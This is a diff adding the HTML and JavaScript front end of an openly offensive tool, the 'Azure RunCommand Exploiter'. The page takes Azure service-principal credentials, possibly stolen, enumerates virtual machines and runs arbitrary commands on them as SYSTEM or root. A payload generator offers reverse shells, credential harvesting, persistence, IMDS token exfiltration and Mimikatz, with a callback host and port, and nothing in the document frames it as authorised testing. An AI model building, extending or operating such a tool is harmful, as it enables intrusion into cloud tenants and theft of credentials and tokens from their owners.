@@ -1,0 +1,562 @@
+{% extends "base.html" %}
+
+{% block title %}Azure RunCommand Exploiter - VM Agent RCE{% endblock %}
+
+{% block content %}
+<div class="space-y-6">
+    <!-- Header -->
+    <div class="flex items-center justify-between">
+        <div>
+            <h1 class="text-3xl font-bold text-white flex items-center gap-3">
+                <span class="text-4xl">☁️</span>
+                Azure RunCommand Exploiter
+                <span class="px-3 py-1 text-sm font-bold bg-gradient-to-r from-blue-500 to-cyan-500 rounded-full">PRO</span>
+            </h1>
+            <p class="text-gray-400 mt-2">RDP şifresi bilmeden SYSTEM yetkisinde komut çalıştır</p>
+        </div>
+        <a href="{{ url_for('main.dashboard') }}" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white transition">
+            ← Dashboard
+        </a>
+    </div>
+
+    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+        <!-- Credentials Panel -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>🔐</span> Azure Credentials
+            </h2>
+
+            <form id="credentialsForm" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Tenant ID</label>
+                    <input type="text" id="tenantId" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+                        class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none font-mono text-sm">
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Client ID (App ID)</label>
+                    <input type="text" id="clientId" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+                        class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none font-mono text-sm">
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Client Secret</label>
+                    <input type="password" id="clientSecret" placeholder="••••••••"
+                        class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Subscription ID</label>
+                    <input type="text" id="subscriptionId" placeholder="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
+                        class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none font-mono text-sm">
+                </div>
+
+                <button type="submit" class="w-full py-2 bg-gradient-to-r from-blue-500 to-cyan-500 hover:from-blue-600 hover:to-cyan-600 rounded-lg text-white font-semibold transition">
+                    🔗 Connect & Enumerate VMs
+                </button>
+            </form>
+
+            <div id="credStatus" class="hidden mt-4 p-3 rounded-lg">
+                <span id="credStatusIcon"></span>
+                <span id="credStatusText"></span>
+            </div>
+        </div>
+
+        <!-- Payload Generator -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>⚔️</span> Payload Generator
+            </h2>
+
+            <form id="payloadForm" class="space-y-4">
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Payload Type</label>
+                    <select id="payloadType" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+                        <option value="reverse_shell">🐚 Reverse Shell</option>
+                        <option value="credential_harvester">🔑 Credential Harvester</option>
+                        <option value="persistence">🔄 Persistence</option>
+                        <option value="imds_exfil">☁️ IMDS Token Exfil</option>
+                        <option value="mimikatz">🔓 Mimikatz (Windows)</option>
+                    </select>
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-gray-300 mb-2">Target OS</label>
+                    <select id="osType" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                    </select>
+                </div>
+
+                <div id="callbackSection" class="grid grid-cols-2 gap-3">
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-2">Callback Host</label>
+                        <input type="text" id="callbackHost" placeholder="10.10.10.10"
+                            class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-medium text-gray-300 mb-2">Callback Port</label>
+                        <input type="number" id="callbackPort" value="4444"
+                            class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+                    </div>
+                </div>
+
+                <button type="submit" class="w-full py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white font-semibold transition">
+                    🔧 Generate Payload
+                </button>
+            </form>
+
+            <div id="payloadResult" class="hidden mt-4">
+                <div class="flex items-center justify-between mb-2">
+                    <span class="text-blue-400 font-medium">Generated Payload</span>
+                    <button onclick="downloadPayload()" class="px-3 py-1 bg-blue-500/20 text-blue-400 rounded text-sm hover:bg-blue-500/30">
+                        📥 Download
+                    </button>
+                </div>
+                <pre id="payloadPreview" class="p-3 bg-gray-900 rounded-lg text-xs text-cyan-400 overflow-x-auto max-h-48 overflow-y-auto font-mono"></pre>
+            </div>
+        </div>
+
+        <!-- Statistics -->
+        <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+            <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+                <span>📊</span> Statistics
+            </h2>
+
+            <div class="space-y-4">
+                <div class="flex items-center justify-between p-3 bg-gray-700/50 rounded-lg">
+                    <span class="text-gray-400">Total VMs</span>
+                    <span id="statTotalVMs" class="text-2xl font-bold text-white">0</span>
+                </div>
+                <div class="flex items-center justify-between p-3 bg-green-500/10 border border-green-500/30 rounded-lg">
+                    <span class="text-green-400">VMs with Agent</span>
+                    <span id="statWithAgent" class="text-2xl font-bold text-green-400">0</span>
+                </div>
+                <div class="flex items-center justify-between p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
+                    <span class="text-blue-400">Windows VMs</span>
+                    <span id="statWindows" class="text-2xl font-bold text-blue-400">0</span>
+                </div>
+                <div class="flex items-center justify-between p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg">
+                    <span class="text-orange-400">Linux VMs</span>
+                    <span id="statLinux" class="text-2xl font-bold text-orange-400">0</span>
+                </div>
+                <div class="flex items-center justify-between p-3 bg-purple-500/10 border border-purple-500/30 rounded-lg">
+                    <span class="text-purple-400">Executions</span>
+                    <span id="statExecutions" class="text-2xl font-bold text-purple-400">0</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- VMs List -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+            <span>🖥️</span> Enumerated Virtual Machines
+        </h2>
+
+        <div class="overflow-x-auto">
+            <table class="w-full text-sm">
+                <thead class="text-gray-400 border-b border-gray-700">
+                    <tr>
+                        <th class="text-left py-3 px-4">VM Name</th>
+                        <th class="text-left py-3 px-4">Resource Group</th>
+                        <th class="text-left py-3 px-4">Location</th>
+                        <th class="text-left py-3 px-4">OS</th>
+                        <th class="text-left py-3 px-4">Agent Status</th>
+                        <th class="text-left py-3 px-4">Power State</th>
+                        <th class="text-left py-3 px-4">Actions</th>
+                    </tr>
+                </thead>
+                <tbody id="vmsList" class="text-gray-300">
+                    <tr>
+                        <td colspan="7" class="text-center py-8 text-gray-500">No VMs enumerated yet. Connect with credentials first.</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Command Execution -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+            <span>💻</span> Execute RunCommand
+        </h2>
+
+        <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-4">
+            <div>
+                <label class="block text-sm font-medium text-gray-300 mb-2">VM Name</label>
+                <input type="text" id="execVmName" placeholder="target-vm"
+                    class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+            </div>
+            <div>
+                <label class="block text-sm font-medium text-gray-300 mb-2">Resource Group</label>
+                <input type="text" id="execResourceGroup" placeholder="target-rg"
+                    class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+            </div>
+            <div>
+                <label class="block text-sm font-medium text-gray-300 mb-2">OS Type</label>
+                <select id="execOsType" class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none">
+                    <option value="windows">Windows</option>
+                    <option value="linux">Linux</option>
+                </select>
+            </div>
+            <div class="flex items-end">
+                <button onclick="executeCommand()" class="w-full py-2 bg-gradient-to-r from-red-500 to-orange-500 hover:from-red-600 hover:to-orange-600 rounded-lg text-white font-semibold transition">
+                    ⚡ Execute
+                </button>
+            </div>
+        </div>
+
+        <div>
+            <label class="block text-sm font-medium text-gray-300 mb-2">Command</label>
+            <textarea id="execCommand" rows="4" placeholder="whoami&#10;hostname&#10;ipconfig"
+                class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-lg text-white focus:border-blue-500 focus:outline-none font-mono text-sm"></textarea>
+        </div>
+
+        <!-- Quick Commands -->
+        <div class="mt-4 flex flex-wrap gap-2">
+            <button onclick="setQuickCommand('whoami')" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded text-sm text-gray-300">whoami</button>
+            <button onclick="setQuickCommand('hostname')" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded text-sm text-gray-300">hostname</button>
+            <button onclick="setQuickCommand('ipconfig /all')" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded text-sm text-gray-300">ipconfig</button>
+            <button onclick="setQuickCommand('Get-Process')" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded text-sm text-gray-300">processes</button>
+            <button onclick="setQuickCommand('Get-LocalUser')" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded text-sm text-gray-300">users</button>
+            <button onclick="setQuickCommand('netstat -ano')" class="px-3 py-1 bg-gray-700 hover:bg-gray-600 rounded text-sm text-gray-300">netstat</button>
+            <button onclick="insertPayload()" class="px-3 py-1 bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 rounded text-sm">📋 Insert Generated Payload</button>
+        </div>
+
+        <!-- Execution Result -->
+        <div id="execResult" class="hidden mt-4">
+            <div class="flex items-center justify-between mb-2">
+                <span class="text-blue-400 font-medium">Execution Result</span>
+                <span id="execStatus" class="px-2 py-1 rounded text-xs"></span>
+            </div>
+            <pre id="execOutput" class="p-4 bg-gray-900 rounded-lg text-sm text-green-400 overflow-x-auto max-h-64 overflow-y-auto font-mono"></pre>
+        </div>
+    </div>
+
+    <!-- Execution History -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <div class="flex items-center justify-between mb-4">
+            <h2 class="text-xl font-semibold text-white flex items-center gap-2">
+                <span>📜</span> Execution History
+            </h2>
+            <button onclick="loadExecutions()" class="px-4 py-2 bg-gray-700 hover:bg-gray-600 rounded-lg text-white text-sm transition">
+                🔄 Refresh
+            </button>
+        </div>
+
+        <div class="overflow-x-auto">
+            <table class="w-full text-sm">
+                <thead class="text-gray-400 border-b border-gray-700">
+                    <tr>
+                        <th class="text-left py-3 px-4">VM</th>
+                        <th class="text-left py-3 px-4">Command</th>
+                        <th class="text-left py-3 px-4">Status</th>
+                        <th class="text-left py-3 px-4">Time</th>
+                    </tr>
+                </thead>
+                <tbody id="executionHistory" class="text-gray-300">
+                    <tr>
+                        <td colspan="4" class="text-center py-8 text-gray-500">No executions yet</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Attack Info -->
+    <div class="bg-gray-800 rounded-xl p-6 border border-gray-700">
+        <h2 class="text-xl font-semibold text-white mb-4 flex items-center gap-2">
+            <span>📖</span> Attack Information
+        </h2>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <div>
+                <h3 class="text-blue-400 font-medium mb-2">Prerequisites</h3>
+                <ul class="text-sm text-gray-400 space-y-1">
+                    <li>• Azure Service Principal credentials (or stolen tokens)</li>
+                    <li>• Microsoft.Compute/virtualMachines/runCommand/action permission</li>
+                    <li>• Target VM must have VM Agent installed and running</li>
+                    <li>• VM must be in Running power state</li>
+                </ul>
+            </div>
+            <div>
+                <h3 class="text-yellow-400 font-medium mb-2">Capabilities</h3>
+                <ul class="text-sm text-gray-400 space-y-1">
+                    <li>• Execute commands as SYSTEM (Windows) or root (Linux)</li>
+                    <li>• No RDP/SSH access required</li>
+                    <li>• Bypass network-level restrictions</li>
+                    <li>• Access IMDS for additional tokens</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+let currentPayload = '';
+let currentPayloadType = '';
+let currentOsType = '';
+
+document.getElementById('credentialsForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const data = {
+        tenant_id: document.getElementById('tenantId').value,
+        client_id: document.getElementById('clientId').value,
+        client_secret: document.getElementById('clientSecret').value,
+        subscription_id: document.getElementById('subscriptionId').value
+    };
+    
+    try {
+        // Set credentials
+        let response = await fetch('/azure-runcommand/api/set-credentials', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        
+        let result = await response.json();
+        
+        if (result.success) {
+            showCredStatus(true, 'Credentials set successfully');
+            
+            // Enumerate VMs
+            response = await fetch('/azure-runcommand/api/enumerate-vms', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({})
+            });
+            
+            result = await response.json();
+            
+            if (result.success) {
+                displayVMs(result.vms);
+                updateStatistics();
+            } else {
+                alert('Error enumerating VMs: ' + result.error);
+            }
+        } else {
+            showCredStatus(false, result.error);
+        }
+    } catch (error) {
+        showCredStatus(false, error.message);
+    }
+});
+
+function showCredStatus(success, message) {
+    const statusDiv = document.getElementById('credStatus');
+    statusDiv.classList.remove('hidden');
+    statusDiv.className = `mt-4 p-3 rounded-lg ${success ? 'bg-green-500/20 border border-green-500/50' : 'bg-red-500/20 border border-red-500/50'}`;
+    document.getElementById('credStatusIcon').textContent = success ? '✅' : '❌';
+    document.getElementById('credStatusText').textContent = message;
+    document.getElementById('credStatusText').className = success ? 'text-green-400 ml-2' : 'text-red-400 ml-2';
+}
+
+function displayVMs(vms) {
+    const tbody = document.getElementById('vmsList');
+    
+    if (vms.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="7" class="text-center py-8 text-gray-500">No VMs found</td></tr>';
+        return;
+    }
+    
+    tbody.innerHTML = vms.map(vm => `
+        <tr class="border-b border-gray-700 hover:bg-gray-700/50">
+            <td class="py-3 px-4 font-medium">${vm.name}</td>
+            <td class="py-3 px-4 text-gray-400">${vm.resource_group}</td>
+            <td class="py-3 px-4">${vm.location}</td>
+            <td class="py-3 px-4">
+                <span class="px-2 py-1 rounded text-xs ${vm.os_type === 'Windows' ? 'bg-blue-500/20 text-blue-400' : 'bg-orange-500/20 text-orange-400'}">
+                    ${vm.os_type}
+                </span>
+            </td>
+            <td class="py-3 px-4">
+                <span class="px-2 py-1 rounded text-xs ${vm.supports_run_command ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
+                    ${vm.vm_agent_status}
+                </span>
+            </td>
+            <td class="py-3 px-4">${vm.power_state}</td>
+            <td class="py-3 px-4">
+                ${vm.supports_run_command ? `
+                    <button onclick="selectVM('${vm.name}', '${vm.resource_group}', '${vm.os_type}')" 
+                        class="px-2 py-1 bg-blue-500/20 text-blue-400 rounded text-xs hover:bg-blue-500/30">
+                        Select
+                    </button>
+                ` : '<span class="text-gray-500 text-xs">N/A</span>'}
+            </td>
+        </tr>
+    `).join('');
+}
+
+function selectVM(name, rg, osType) {
+    document.getElementById('execVmName').value = name;
+    document.getElementById('execResourceGroup').value = rg;
+    document.getElementById('execOsType').value = osType.toLowerCase();
+    
+    // Scroll to command section
+    document.getElementById('execCommand').scrollIntoView({ behavior: 'smooth' });
+}
+
+document.getElementById('payloadForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    currentPayloadType = document.getElementById('payloadType').value;
+    currentOsType = document.getElementById('osType').value;
+    
+    const data = {
+        payload_type: currentPayloadType,
+        os_type: currentOsType,
+        callback_host: document.getElementById('callbackHost').value,
+        callback_port: document.getElementById('callbackPort').value
+    };
+    
+    try {
+        const response = await fetch('/azure-runcommand/api/generate-payload', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            currentPayload = result.payload;
+            document.getElementById('payloadPreview').textContent = result.payload;
+            document.getElementById('payloadResult').classList.remove('hidden');
+        } else {
+            alert('Error: ' + result.error);
+        }
+    } catch (error) {
+        alert('Error: ' + error.message);
+    }
+});
+
+async function downloadPayload() {
+    const data = {
+        payload_type: currentPayloadType,
+        os_type: currentOsType,
+        callback_host: document.getElementById('callbackHost').value,
+        callback_port: document.getElementById('callbackPort').value
+    };
+    
+    const response = await fetch('/azure-runcommand/api/download-payload', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+    });
+    
+    const blob = await response.blob();
+    const url = window.URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `${currentPayloadType}_${currentOsType}.${currentOsType === 'windows' ? 'ps1' : 'sh'}`;
+    a.click();
+}
+
+function setQuickCommand(cmd) {
+    document.getElementById('execCommand').value = cmd;
+}
+
+function insertPayload() {
+    if (currentPayload) {
+        document.getElementById('execCommand').value = currentPayload;
+    } else {
+        alert('Generate a payload first');
+    }
+}
+
+async function executeCommand() {
+    const data = {
+        vm_name: document.getElementById('execVmName').value,
+        resource_group: document.getElementById('execResourceGroup').value,
+        os_type: document.getElementById('execOsType').value,
+        command: document.getElementById('execCommand').value
+    };
+    
+    if (!data.vm_name || !data.resource_group || !data.command) {
+        alert('VM name, resource group, and command are required');
+        return;
+    }
+    
+    try {
+        const response = await fetch('/azure-runcommand/api/run-command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        
+        const result = await response.json();
+        
+        if (result.success) {
+            const exec = result.execution;
+            
+            document.getElementById('execStatus').textContent = exec.status;
+            document.getElementById('execStatus').className = `px-2 py-1 rounded text-xs ${exec.status === 'Succeeded' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`;
+            
+            document.getElementById('execOutput').textContent = exec.output || exec.error || 'No output';
+            document.getElementById('execResult').classList.remove('hidden');
+            
+            loadExecutions();
+            updateStatistics();
+        } else {
+            alert('Error: ' + result.error);
+        }
+    } catch (error) {
+        alert('Error: ' + error.message);
+    }
+}
+
+async function loadExecutions() {
+    try {
+        const response = await fetch('/azure-runcommand/api/executions');
+        const result = await response.json();
+        
+        const tbody = document.getElementById('executionHistory');
+        
+        if (result.executions && result.executions.length > 0) {
+            tbody.innerHTML = result.executions.map(e => `
+                <tr class="border-b border-gray-700 hover:bg-gray-700/50">
+                    <td class="py-3 px-4">${e.vm_name}</td>
+                    <td class="py-3 px-4 font-mono text-xs">${e.command}</td>
+                    <td class="py-3 px-4">
+                        <span class="px-2 py-1 rounded text-xs ${e.status === 'Succeeded' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}">
+                            ${e.status}
+                        </span>
+                    </td>
+                    <td class="py-3 px-4 text-gray-500">${e.start_time}</td>
+                </tr>
+            `).join('');
+        }
+    } catch (error) {
+        console.error('Failed to load executions:', error);
+    }
+}
+
+async function updateStatistics() {
+    try {
+        const response = await fetch('/azure-runcommand/api/summary');
+        const stats = await response.json();
+        
+        document.getElementById('statTotalVMs').textContent = stats.total_vms || 0;
+        document.getElementById('statWithAgent').textContent = stats.vms_with_agent || 0;
+        document.getElementById('statWindows').textContent = stats.windows_vms || 0;
+        document.getElementById('statLinux').textContent = stats.linux_vms || 0;
+        document.getElementById('statExecutions').textContent = stats.total_executions || 0;
+    } catch (error) {
+        console.error('Failed to update statistics:', error);
+    }
+}
+
+// Toggle callback section based on payload type
+document.getElementById('payloadType').addEventListener('change', function() {
+    const callbackSection = document.getElementById('callbackSection');
+    const needsCallback = ['reverse_shell', 'persistence'].includes(this.value);
+    callbackSection.style.opacity = needsCallback ? '1' : '0.5';
+});
+
+// Initial load
+loadExecutions();
+updateStatistics();
+</script>
+{% endblock %}
